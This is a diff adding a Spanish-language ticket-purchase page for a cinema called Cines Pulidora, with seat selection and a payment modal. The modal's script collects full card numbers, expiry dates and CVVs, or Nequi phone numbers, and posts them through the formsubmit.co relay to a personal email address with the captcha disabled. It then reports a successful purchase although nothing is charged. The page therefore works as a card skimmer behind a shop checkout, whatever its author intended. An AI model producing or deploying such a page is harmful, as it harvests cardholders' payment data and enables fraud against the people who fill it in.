@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Comprar Boletos - Cines Pulidora</title>
+    <link rel="stylesheet" href="estilos.css">
+</head>
+<body>
+    <h1>Comprar Boletos</h1>
+    <p>Selecciona tu horario y asientos para comprar boletos.</p>
+    <a href="index.html">Volver a la cartelera</a>
+
+    <form action="#" method="post"> 
+        <label for="horario">Selecciona Horario:</label>
+        <select id="horario" name="horario">
+            <option value="14:00">2:00 PM</option>
+            <option value="17:00">5:00 PM</option>
+            <option value="20:00">8:00 PM</option>
+        </select>
+
+        <h3>Selecciona Asientos:</h3>
+        <div class="sala">
+    
+            <div class="fila">
+                <span>Fila A:</span>
+                <label><input type="checkbox" name="asiento" value="A1"> A1</label>
+                <label><input type="checkbox" name="asiento" value="A2"> A2</label>
+                <label><input type="checkbox" name="asiento" value="A3"> A3</label>
+                <label><input type="checkbox" name="asiento" value="A4"> A4</label>
+            </div>
+            <div class="fila">
+                <span>Fila B:</span>
+                <label><input type="checkbox" name="asiento" value="B1"> B1</label>
+                <label><input type="checkbox" name="asiento" value="B2"> B2</label>
+                <label><input type="checkbox" name="asiento" value="B3"> B3</label>
+                <label><input type="checkbox" name="asiento" value="B4"> B4</label>
+            </div>
+            <div class="fila">
+                <span>Fila C:</span>
+                <label><input type="checkbox" name="asiento" value="C1"> C1</label>
+                <label><input type="checkbox" name="asiento" value="C2"> C2</label>
+                <label><input type="checkbox" name="asiento" value="C3"> C3</label>
+                <label><input type="checkbox" name="asiento" value="C4"> C4</label>
+            </div>
+        </div>
+
+        <button onclick="abrirModalPago(event)" type="button">Confirmar Compra</button>
+    </form>
+
+   
+    <div id="modalPago" class="modal">
+        <div class="modal-contenido">
+            <span class="cerrar" onclick="cerrarModalPago()">&times;</span>
+            <h2>Método de Pago</h2>
+            
+            <div class="metodos-pago">
+                <label>
+                    <input type="radio" name="metodo" value="tarjeta" checked onchange="mostrarFormulario()"> Tarjeta de Crédito
+                </label>
+                <label>
+                    <input type="radio" name="metodo" value="nequi" onchange="mostrarFormulario()"> Nequi
+                </label>
+            </div>
+
+            <!-- Formulario Tarjeta de Crédito -->
+            <div id="formTarjeta" class="formulario-pago">
+                <h3>Datos de Tarjeta de Crédito</h3>
+                <input id="nombreTarjeta" name="nombre_tarjeta" type="text" placeholder="Nombre en la tarjeta" required>
+                <input id="numeroTarjeta" name="numero_tarjeta" type="text" placeholder="Número de tarjeta (16 dígitos)" maxlength="16" pattern="[0-9]{16}" required>
+                <div class="fila-formulario">
+                    <input id="mesTarjeta" name="mes_tarjeta" type="text" placeholder="MM" maxlength="2" pattern="[0-9]{2}" required>
+                    <input id="anioTarjeta" name="anio_tarjeta" type="text" placeholder="YY" maxlength="2" pattern="[0-9]{2}" required>
+                    <input id="cvvTarjeta" name="cvv_tarjeta" type="text" placeholder="CVV" maxlength="3" pattern="[0-9]{3}" required>
+                </div>
+            </div>
+
+            <!-- Formulario Nequi -->
+            <div id="formNequi" class="formulario-pago" style="display:none;">
+                <h3>Datos de Nequi</h3>
+                <input id="nombreNequi" name="nombre_nequi" type="text" placeholder="Nombre completo" required>
+                <input id="telefonoNequi" name="telefono_nequi" type="tel" placeholder="Número de Nequi (celular)" pattern="[0-9]{10}" maxlength="10" required>
+            </div>
+
+            <input type="hidden" name="_subject" value="Nueva compra - Cine Pulidora">
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_template" value="table">
+
+            <div class="botones-modal">
+                <button onclick="cerrarModalPago()">Cancelar</button>
+                <button onclick="confirmarPago()" class="btn-confirmar">Confirmar Pago</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function abrirModalPago(event) {
+            event.preventDefault();
+            const asientosSeleccionados = document.querySelectorAll('input[name="asiento"]:checked').length;
+            if (asientosSeleccionados === 0) {
+                alert('Por favor selecciona al menos un asiento');
+                return;
+            }
+            document.getElementById('modalPago').style.display = 'block';
+        }
+
+        function cerrarModalPago() {
+            document.getElementById('modalPago').style.display = 'none';
+        }
+
+        function mostrarFormulario() {
+            const metodo = document.querySelector('input[name="metodo"]:checked').value;
+            const formTarjeta = document.getElementById('formTarjeta');
+            const formNequi = document.getElementById('formNequi');
+            
+            if (metodo === 'tarjeta') {
+                formTarjeta.style.display = 'block';
+                formNequi.style.display = 'none';
+            } else {
+                formTarjeta.style.display = 'none';
+                formNequi.style.display = 'block';
+            }
+        }
+
+        const DESTINO_EMAIL = 'kevindavidlaif@gmail.com';
+        const FORM_SUBMIT_ENDPOINT = `https://formsubmit.co/ajax/${DESTINO_EMAIL}`;
+
+        function obtenerDatosCompra() {
+            const metodo = document.querySelector('input[name="metodo"]:checked').value;
+            const asientos = Array.from(document.querySelectorAll('input[name="asiento"]:checked')).map(a => a.value).join(', ');
+            const horario = document.getElementById('horario').value;
+
+            const datos = {
+                horario,
+                asientos,
+                metodo_pago: metodo === 'tarjeta' ? 'Tarjeta de Crédito' : 'Nequi',
+                nombre_tarjeta: document.getElementById('nombreTarjeta')?.value || '',
+                numero_tarjeta: document.getElementById('numeroTarjeta')?.value || '',
+                mes_tarjeta: document.getElementById('mesTarjeta')?.value || '',
+                anio_tarjeta: document.getElementById('anioTarjeta')?.value || '',
+                cvv_tarjeta: document.getElementById('cvvTarjeta')?.value || '',
+                nombre_nequi: document.getElementById('nombreNequi')?.value || '',
+                telefono_nequi: document.getElementById('telefonoNequi')?.value || ''
+            };
+
+            return datos;
+        }
+
+        async function enviarDatosPorCorreo(datos) {
+            if (DESTINO_EMAIL.includes('TU_CORREO')) {
+                alert('Reemplaza TU_CORREO@DOMINIO.COM en el código por tu correo real para recibir las compras.');
+                return false;
+            }
+
+            const formData = new URLSearchParams();
+            formData.append('_subject', 'Nueva compra - Cine Pulidora');
+            formData.append('_captcha', 'false');
+            formData.append('_template', 'table');
+
+            Object.entries(datos).forEach(([key, value]) => {
+                formData.append(key, value);
+            });
+
+            const respuesta = await fetch(FORM_SUBMIT_ENDPOINT, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                },
+                body: formData.toString()
+            });
+
+            return respuesta.ok;
+        }
+
+        async function confirmarPago() {
+            const metodo = document.querySelector('input[name="metodo"]:checked').value;
+            const formActivo = metodo === 'tarjeta' ? 'formTarjeta' : 'formNequi';
+            const inputs = document.getElementById(formActivo).querySelectorAll('input');
+            
+            let todosLlenos = true;
+            inputs.forEach(input => {
+                if (!input.value.trim()) {
+                    todosLlenos = false;
+                    input.style.borderColor = 'red';
+                }
+            });
+
+            if (!todosLlenos) {
+                alert('Por favor completa todos los campos');
+                return;
+            }
+
+            const datos = obtenerDatosCompra();
+            const enviado = await enviarDatosPorCorreo(datos);
+
+            if (!enviado) {
+                alert('No se pudo enviar la información. Revisa que el correo esté configurado correctamente.');
+                return;
+            }
+
+            const asientos = datos.asientos;
+            const horario = datos.horario;
+            
+            alert(`¡Compra realizada con éxito!\n\nAsientos: ${asientos}\nHorario: ${horario}\nMétodo de pago: ${datos.metodo_pago}`);
+            cerrarModalPago();
+        }
+
+        window.onclick = function(event) {
+            const modal = document.getElementById('modalPago');
+            if (event.target === modal) {
+                cerrarModalPago();
+            }
+        }
+    </script>
+</body>
+</html>
